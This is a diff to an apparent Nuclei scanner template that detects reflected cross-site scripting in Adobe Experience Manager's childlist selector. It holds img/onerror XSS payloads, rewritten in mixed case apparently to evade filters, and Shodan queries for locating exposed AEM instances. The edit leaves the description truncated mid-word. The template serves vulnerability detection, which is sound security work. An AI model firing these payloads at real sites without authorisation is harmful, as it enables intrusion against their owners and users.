@@ -4,7 +4,7 @@ http:
     part: body
     type: word
     words:
-    - <img src="x" data onerror="alert(domain)"/>
+    - <iMg sRc="x" data oneRror="prompt(domain)"/>
     - <br /><br />please authenticate<br /><br />
   - part: body
     type: word
@@ -20,31 +20,26 @@ http:
   matchers-condition: and
   method: GET
   path:
-  - '{{BaseURL}}/{{rand_base(4)}}<img src=x data''a''onerror=alert(domain)>.childrenlist.html'
+  - '{{BaseURL}}/{{rand_base(4)}}<iMg sRc=x data''a''oneRror=prompt(domain)>.childrenlist.html'
   - '{{BaseURL}}/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html'
   stop-at-first-match: true
 id: aem-xss-childlist
 info:
-  author: theabhinavgaur
+  author: theabhinavgaur,ott3rly
   classification:
-    cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 5.4
     cwe-id: CWE-80
   description: 'Adobe Experience Manager contains a cross-site scripting vulnerability
-    via requests using the childlist selector when a dispatcher does not respect the
-    content type responded by AEM and flips from application/json to text/html. As
-    a consequence, the reflected suffix is executed and interpreted in the browser.
+    via requests using the c>
 
     '
   metadata:
     max-request: 2
-    product: experience_manager
     shodan-query:
     - http.title:"AEM Sign In"
     - http.component:"Adobe Experience Manager"
-    vendor: adobe
     verified: true
   name: Adobe Experience Manager Childlist Selector - Cross-Site Scripting
   severity: medium
-  tags: xss,aem,adobe,misconfig,vuln
+  tags: xss,aem,adobe,misconfig
